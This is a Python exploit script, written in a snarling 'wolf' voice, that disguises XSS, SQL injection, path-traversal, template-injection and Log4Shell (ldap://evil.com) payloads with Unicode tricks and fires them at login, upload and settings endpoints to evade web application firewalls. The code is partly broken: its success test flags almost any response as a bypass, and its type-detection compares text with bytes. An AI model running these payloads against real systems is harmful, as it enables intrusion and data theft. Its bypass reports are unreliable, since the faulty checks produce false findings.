#!/usr/bin/env python3
"""🐺 Unicode Normalization Bypass Exploits

*snarls with predatory intelligence* These exploits leverage Unicode normalization
vulnerabilities to bypass WAFs and security controls. Visual confusables, overlong
encodings, and improper case mappings are our weapons of choice!

Based on 2025 research showing flaws in Unicode normalization can bypass security
mechanisms in web applications and WAFs.
"""

import asyncio
import logging
import unicodedata
from typing import Any

import aiohttp

# Configure logging
logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)


class UnicodeNormalizationBypass:
    """🐺 *teeth gleam with menace* Unicode normalization exploit class that hunts
    for vulnerabilities in WAF parsing and backend validation through various
    Unicode manipulation techniques.
    """

    def __init__(self, target_url: str = "http://localhost:8000"):
        self.target_url = target_url.rstrip("/")
        self.session: aiohttp.ClientSession | None = None

        # Unicode confusables for bypassing string matching
        self.confusables = {
            "a": [
                "а",
                "ɑ",
                "α",
                "𝐚",
                "𝑎",
                "𝒂",
                "𝓪",
                "𝔞",
                "𝕒",
                "𝖆",
                "𝖺",
                "𝗮",
                "𝘢",
                "𝙖",
                "𝚊",
            ],
            "e": ["е", "ℯ", "𝐞", "𝑒", "𝒆", "𝓮", "𝔢", "𝕖", "𝖊", "𝖾", "𝗲", "𝘦", "𝙚", "𝚎"],
            "o": ["о", "ο", "𝐨", "𝑜", "𝒐", "𝓸", "𝔬", "𝕠", "𝖔", "𝗈", "𝗼", "𝘰", "𝙤", "𝚘"],
            "i": ["і", "ι", "𝐢", "𝑖", "𝒊", "𝓲", "𝔦", "𝕚", "𝖎", "𝗂", "𝗶", "𝘪", "𝙞", "𝚒"],
            "u": ["υ", "ս", "𝐮", "𝑢", "𝒖", "𝓾", "𝔲", "𝕦", "𝖚", "𝗎", "𝘂", "𝘶", "𝙪", "𝚞"],
            "n": ["п", "ո", "𝐧", "𝑛", "𝒏", "𝓷", "𝔫", "𝕟", "𝖓", "𝗇", "𝗻", "𝘯", "𝙣", "𝚗"],
            "c": ["с", "ϲ", "𝐜", "𝑐", "𝒄", "𝓬", "𝔠", "𝕔", "𝖈", "𝖼", "𝗰", "𝘤", "𝙘", "𝚌"],
            "r": ["г", "ⲅ", "𝐫", "𝑟", "𝒓", "𝓻", "𝔯", "𝕣", "𝖗", "𝗋", "𝗿", "𝘳", "𝙧", "𝚛"],
            "p": ["р", "ρ", "𝐩", "𝑝", "𝒑", "𝓹", "𝔭", "𝕡", "𝖕", "𝗉", "𝗽", "𝘱", "𝙥", "𝚙"],
            "h": ["һ", "ℎ", "𝐡", "𝒽", "𝒉", "𝓱", "𝔥", "𝕙", "𝖍", "𝗁", "𝗵", "𝘩", "𝙝", "𝚑"],
            "s": ["ѕ", "𝐬", "𝑠", "𝒔", "𝓼", "𝔰", "𝕤", "𝖘", "𝗌", "𝘀", "𝘴", "𝙨", "𝚜"],
            "t": ["т", "τ", "𝐭", "𝑡", "𝒕", "𝓽", "𝔱", "𝕥", "𝖙", "𝗍", "𝘁", "𝘵", "𝙩", "𝚝"],
            "x": ["х", "χ", "𝐱", "𝑥", "𝒙", "𝔁", "𝔵", "𝕩", "𝖝", "𝗑", "𝘅", "𝘹", "𝙭", "𝚡"],
            "y": ["у", "γ", "𝐲", "𝑦", "𝒚", "𝔂", "𝔶", "𝕪", "𝖞", "𝗒", "𝘆", "𝘺", "𝙮", "𝚢"],
            "j": ["ј", "𝐣", "𝑗", "𝒋", "𝓳", "𝔧", "𝕛", "𝖏", "𝗃", "𝗷", "𝘫", "𝙟", "𝚓"],
            "l": ["ӏ", "ⅼ", "𝐥", "𝑙", "𝒍", "𝓵", "𝔩", "𝕝", "𝖑", "𝗅", "𝗹", "𝘭", "𝙡", "𝚕"],
            "w": ["ԝ", "ω", "𝐰", "𝑤", "𝒘", "𝔀", "𝔴", "𝕨", "𝖜", "𝗐", "𝘄", "𝘸", "𝙬", "𝚠"],
            "m": ["м", "ⅿ", "𝐦", "𝑚", "𝒎", "𝓶", "𝔪", "𝕞", "𝖒", "𝗆", "𝗺", "𝘮", "𝙢", "𝚖"],
            "v": ["ν", "ѵ", "𝐯", "𝑣", "𝒗", "𝓿", "𝔳", "𝕧", "𝖛", "𝗏", "𝘃", "𝘷", "𝙫", "𝚟"],
            "q": ["ԛ", "𝐪", "𝑞", "𝒒", "𝓺", "𝔮", "𝕢", "𝖖", "𝗊", "𝗾", "𝘲", "𝙦", "𝚚"],
            "k": ["к", "κ", "𝐤", "𝑘", "𝒌", "𝓴", "𝔨", "𝕜", "𝖐", "𝗄", "𝗸", "𝘬", "𝙠", "𝚔"],
            "g": ["ց", "𝐠", "𝑔", "𝒈", "𝓰", "𝔤", "𝕘", "𝖌", "𝗀", "𝗴", "𝘨", "𝙜", "𝚐"],
            "b": ["Ь", "ҍ", "𝐛", "𝑏", "𝒃", "𝓫", "𝔟", "𝕓", "𝖇", "𝖻", "𝗯", "𝘣", "𝙗", "𝚋"],
            "d": ["ԁ", "𝐝", "𝑑", "𝒅", "𝓭", "𝔡", "𝕕", "𝖉", "𝖽", "𝗱", "𝘥", "𝙙", "𝚍"],
            "f": ["ḟ", "𝐟", "𝑓", "𝒇", "𝓯", "𝔣", "𝕗", "𝖋", "𝖿", "𝗳", "𝘧", "𝙛", "𝚏"],
            "z": ["ᴢ", "𝐳", "𝑧", "𝒛", "𝔃", "𝔷", "𝕫", "𝖟", "𝗓", "𝘇", "𝘻", "𝙯", "𝚣"],
        }

        # Overlong UTF-8 sequences
        self.overlong_sequences = {
            "<": ["\xc0\xbc", "\xe0\x80\xbc", "\xf0\x80\x80\xbc"],
            ">": ["\xc0\xbe", "\xe0\x80\xbe", "\xf0\x80\x80\xbe"],
            '"': ["\xc0\xa2", "\xe0\x80\xa2", "\xf0\x80\x80\xa2"],
            "'": ["\xc0\xa7", "\xe0\x80\xa7", "\xf0\x80\x80\xa7"],
            "/": ["\xc0\xaf", "\xe0\x80\xaf", "\xf0\x80\x80\xaf"],
            "\\": ["\xc0\xac", "\xe0\x80\xac", "\xf0\x80\x80\xac"],
            ".": ["\xc0\xae", "\xe0\x80\xae", "\xf0\x80\x80\xae"],
            "=": ["\xc0\xbd", "\xe0\x80\xbd", "\xf0\x80\x80\xbd"],
            "&": ["\xc0\xa6", "\xe0\x80\xa6", "\xf0\x80\x80\xa6"],
            "?": ["\xc0\xbf", "\xe0\x80\xbf", "\xf0\x80\x80\xbf"],
            " ": ["\xc0\xa0", "\xe0\x80\xa0", "\xf0\x80\x80\xa0"],
        }

    async def __aenter__(self):
        self.session = aiohttp.ClientSession()
        return self

    async def __aexit__(self, exc_type, exc_val, exc_tb):
        if self.session:
            await self.session.close()

    def generate_confusable_payloads(self, base_payload: str) -> list[str]:
        """🐺 *snarls with cunning* Generate visually similar payloads using Unicode
        confusables to bypass string-based WAF rules.
        """
        payloads = [base_payload]

        # Single character substitutions
        for i, char in enumerate(base_payload.lower()):
            if char in self.confusables:
                for confusable in self.confusables[char][:3]:  # Use first 3 confusables
                    new_payload = base_payload[:i] + confusable + base_payload[i + 1 :]
                    payloads.append(new_payload)

        # Multiple character substitutions
        confusable_payload = ""
        for char in base_payload.lower():
            if char in self.confusables:
                confusable_payload += self.confusables[char][0]
            else:
                confusable_payload += char

        if confusable_payload != base_payload:
            payloads.append(confusable_payload)

        return payloads

    def generate_overlong_payloads(self, base_payload: str) -> list[str]:
        """🐺 *teeth gleam with satisfaction* Generate overlong UTF-8 encoded payloads
        to bypass WAF parsing that doesn't properly handle malformed Unicode.
        """
        payloads = []

        for char, sequences in self.overlong_sequences.items():
            if char in base_payload:
                for seq in sequences:
                    new_payload = base_payload.replace(char, seq)
                    payloads.append(new_payload)

        return payloads

    def generate_normalization_payloads(self, base_payload: str) -> list[str]:
        """🐺 *howls with predatory glee* Generate payloads using different Unicode
        normalization forms to exploit inconsistent normalization handling.
        """
        payloads = []

        # Different normalization forms
        forms = ["NFC", "NFD", "NFKC", "NFKD"]

        for form in forms:
            try:
                normalized = unicodedata.normalize(form, base_payload)
                if normalized != base_payload:
                    payloads.append(normalized)
            except Exception:
                pass

        # Mixed normalization - normalize different parts differently
        if len(base_payload) > 2:
            mid = len(base_payload) // 2
            mixed1 = unicodedata.normalize(
                "NFC",
                base_payload[:mid],
            ) + unicodedata.normalize("NFD", base_payload[mid:])
            mixed2 = unicodedata.normalize(
                "NFD",
                base_payload[:mid],
            ) + unicodedata.normalize("NFC", base_payload[mid:])
            payloads.extend([mixed1, mixed2])

        return payloads

    def generate_case_mapping_payloads(self, base_payload: str) -> list[str]:
        """🐺 *snarls with cunning intelligence* Generate payloads exploiting improper
        case mapping handling in Unicode processing.
        """
        payloads = []

        # Turkish I problem and similar case mapping issues
        turkish_mappings = {
            "i": "İ",  # Latin Small Letter I -> Latin Capital Letter I With Dot Above
            "I": "ı",  # Latin Capital Letter I -> Latin Small Letter Dotless I
        }

        for char, mapping in turkish_mappings.items():
            if char in base_payload:
                new_payload = base_payload.replace(char, mapping)
                payloads.append(new_payload)

        # Special Unicode case conversions
        payloads.extend(
            [
                base_payload.upper(),
                base_payload.lower(),
                base_payload.title(),
                base_payload.swapcase(),
                base_payload.casefold(),  # More aggressive lowercase
            ],
        )

        return list(set(payloads))  # Remove duplicates

    def generate_truncation_payloads(self, base_payload: str) -> list[str]:
        """🐺 *bares fangs menacingly* Generate payloads that exploit Unicode truncation
        vulnerabilities in systems with different length limits.
        """
        payloads = []

        # Add invisible characters that might be truncated
        invisible_chars = [
            "\u200b",  # Zero Width Space
            "\u200c",  # Zero Width Non-Joiner
            "\u200d",  # Zero Width Joiner
            "\u2060",  # Word Joiner
            "\ufeff",  # Zero Width No-Break Space
            "\u034f",  # Combining Grapheme Joiner
        ]

        for char in invisible_chars:
            # Add at beginning, middle, and end
            payloads.append(char + base_payload)
            payloads.append(base_payload + char)
            if len(base_payload) > 2:
                mid = len(base_payload) // 2
                payloads.append(base_payload[:mid] + char + base_payload[mid:])

        # Add combining characters that might affect truncation
        combining_chars = [
            "\u0300",  # Combining Grave Accent
            "\u0301",  # Combining Acute Accent
            "\u0302",  # Combining Circumflex Accent
            "\u0303",  # Combining Tilde
            "\u0304",  # Combining Macron
        ]

        for char in combining_chars:
            if len(base_payload) > 0:
                # Add combining character to first character
                payloads.append(base_payload[0] + char + base_payload[1:])

        return payloads

    async def test_unicode_bypass(
        self,
        endpoint: str,
        parameter: str,
        base_payload: str,
    ) -> dict[str, Any]:
        """🐺 *coordinated pack attack* Test Unicode normalization bypasses against
        a specific endpoint and parameter.
        """
        results = {
            "endpoint": endpoint,
            "parameter": parameter,
            "base_payload": base_payload,
            "successful_bypasses": [],
            "error_responses": [],
            "total_tests": 0,
            "bypasses_found": 0,
        }

        if not self.session:
            logger.error("Session not initialized. Use async context manager.")
            return results

        # Generate all payload variations
        all_payloads = []
        all_payloads.extend(self.generate_confusable_payloads(base_payload))
        all_payloads.extend(self.generate_overlong_payloads(base_payload))
        all_payloads.extend(self.generate_normalization_payloads(base_payload))
        all_payloads.extend(self.generate_case_mapping_payloads(base_payload))
        all_payloads.extend(self.generate_truncation_payloads(base_payload))

        # Remove duplicates while preserving order
        seen = set()
        unique_payloads = []
        for payload in all_payloads:
            if payload not in seen:
                seen.add(payload)
                unique_payloads.append(payload)

        results["total_tests"] = len(unique_payloads)
        logger.info(
            f"🐺 Testing {len(unique_payloads)} Unicode bypass payloads against {endpoint}",
        )

        # Test each payload
        for i, payload in enumerate(unique_payloads):
            try:
                # Test with different encoding methods
                test_data = {parameter: payload}

                async with self.session.post(
                    f"{self.target_url}{endpoint}",
                    data=test_data,
                    timeout=10,
                ) as response:

                    response_text = await response.text()

                    # Check for signs of successful bypass
                    bypass_indicators = [
                        response.status == 200,
                        "error" not in response_text.lower(),
                        "blocked" not in response_text.lower(),
                        "forbidden" not in response_text.lower(),
                        "rejected" not in response_text.lower(),
                        len(response_text) > 100,  # Substantial response
                    ]

                    if any(bypass_indicators):
                        results["successful_bypasses"].append(
                            {
                                "payload": payload,
                                "status_code": response.status,
                                "response_length": len(response_text),
                                "bypass_type": self._identify_bypass_type(
                                    payload,
                                    base_payload,
                                ),
                                "encoding": "UTF-8",
                            },
                        )
                        results["bypasses_found"] += 1
                        logger.warning(f"🐺 BYPASS FOUND: {payload[:50]}...")

                    if response.status >= 400:
                        results["error_responses"].append(
                            {
                                "payload": payload,
                                "status_code": response.status,
                                "error_message": response_text[:200],
                            },
                        )

            except Exception as e:
                logger.error(f"Error testing payload {i+1}: {e!s}")
                results["error_responses"].append({"payload": payload, "error": str(e)})

            # Progress indicator
            if (i + 1) % 10 == 0:
                logger.info(f"🐺 Tested {i+1}/{len(unique_payloads)} payloads...")

        logger.info(
            f"🐺 Unicode bypass test complete: {results['bypasses_found']} bypasses found",
        )
        return results

    def _identify_bypass_type(self, payload: str, base_payload: str) -> str:
        """Identify which type of Unicode bypass was used."""
        if any(
            char in payload for chars in self.confusables.values() for char in chars
        ):
            return "confusable_characters"
        if any(
            seq in payload.encode("utf-8", "replace")
            for sequences in self.overlong_sequences.values()
            for seq in sequences
        ):
            return "overlong_encoding"
        if unicodedata.normalize("NFC", payload) != payload:
            return "normalization_form"
        if payload != base_payload and payload.lower() == base_payload.lower():
            return "case_mapping"
        if any(
            char in payload
            for char in ["\u200b", "\u200c", "\u200d", "\u2060", "\ufeff", "\u034f"]
        ):
            return "invisible_characters"
        return "unknown"

    async def comprehensive_unicode_test(self) -> dict[str, Any]:
        """🐺 *alpha pack coordination* Run comprehensive Unicode bypass tests
        against common vulnerable endpoints.
        """
        test_endpoints = [
            ("/api/search", "query"),
            ("/api/users/create", "username"),
            ("/api/auth/login", "email"),
            ("/api/comments/create", "content"),
            ("/api/files/upload", "filename"),
            ("/api/settings/update", "value"),
        ]

        test_payloads = [
            '<script>alert("XSS")</script>',
            "'OR 1=1--",
            "../../../etc/passwd",
            "admin",
            "SELECT * FROM users",
            "${jndi:ldap://evil.com/a}",
            "javascript:alert(1)",
            "{{7*7}}",
            "<%=7*7%>",
        ]

        all_results = {
            "test_summary": {
                "total_endpoints": len(test_endpoints),
                "total_payloads": len(test_payloads),
                "total_tests": len(test_endpoints) * len(test_payloads),
                "bypasses_found": 0,
                "endpoints_vulnerable": 0,
            },
            "endpoint_results": [],
        }

        logger.info("🐺 Starting comprehensive Unicode bypass testing...")

        for endpoint, parameter in test_endpoints:
            endpoint_vulnerable = False
            endpoint_results = {
                "endpoint": endpoint,
                "parameter": parameter,
                "payload_results": [],
                "total_bypasses": 0,
            }

            for payload in test_payloads:
                result = await self.test_unicode_bypass(endpoint, parameter, payload)
                endpoint_results["payload_results"].append(result)
                endpoint_results["total_bypasses"] += result["bypasses_found"]

                if result["bypasses_found"] > 0:
                    endpoint_vulnerable = True
                    all_results["test_summary"]["bypasses_found"] += result[
                        "bypasses_found"
                    ]

            if endpoint_vulnerable:
                all_results["test_summary"]["endpoints_vulnerable"] += 1

            all_results["endpoint_results"].append(endpoint_results)

        logger.info(
            f"🐺 Comprehensive test complete: {all_results['test_summary']['bypasses_found']} total bypasses found",
        )
        return all_results


async def main():
    """🐺 *howls with predatory satisfaction* Main hunting function for Unicode
    normalization bypass testing.
    """
    target_url = "http://localhost:8000"

    async with UnicodeNormalizationBypass(target_url) as exploit:
        print("🐺 Starting Unicode Normalization Bypass Exploitation...")

        # Run comprehensive tests
        results = await exploit.comprehensive_unicode_test()

        print("\n🐺 HUNT RESULTS:")
        print(f"Total bypasses found: {results['test_summary']['bypasses_found']}")
        print(
            f"Vulnerable endpoints: {results['test_summary']['endpoints_vulnerable']}",
        )

        # Show detailed results for vulnerable endpoints
        for endpoint_result in results["endpoint_results"]:
            if endpoint_result["total_bypasses"] > 0:
                print(f"\n🐺 VULNERABLE: {endpoint_result['endpoint']}")
                print(f"Parameter: {endpoint_result['parameter']}")
                print(f"Bypasses found: {endpoint_result['total_bypasses']}")

                for payload_result in endpoint_result["payload_results"]:
                    if payload_result["bypasses_found"] > 0:
                        print(f"  Payload: {payload_result['base_payload']}")
                        for bypass in payload_result["successful_bypasses"]:
                            print(
                                f"    ✓ {bypass['bypass_type']}: {bypass['payload'][:50]}...",
                            )


if __name__ == "__main__":
    asyncio.run(main())
